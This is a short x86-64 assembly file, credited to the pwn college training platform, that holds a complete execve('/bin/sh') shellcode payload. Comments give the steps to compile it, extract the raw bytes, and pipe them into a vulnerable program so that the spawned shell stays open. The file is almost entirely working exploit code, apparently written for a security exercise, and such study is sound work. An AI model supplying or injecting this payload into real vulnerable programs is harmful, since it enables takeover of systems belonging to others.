# credits: pwn college
# to compile: gcc -nostdlib -static shellcode.s -o shellcode-elf
# to parse the shellcode: objcopy --dump-section .text=shellcode_raw shellcodeelf 
# when sending to vulnerable program: cat shellcode-raw; cat
# reason we have the "cat" is that it'll immediately terminate once bin/sh is run we need to make it hang
.global _start
_start:
.intel_syntax noprefix
    mov rax, 59             # syscall for execve is 59 
    lea rdi, [rip+binsh]    # into the first argument passing in "/bin/sh"
    mov rsi, 0              # NULL for second argument
    mov rdx, 0              # NULL for third argument
    syscall

binsh:
    .string "/bin/sh"
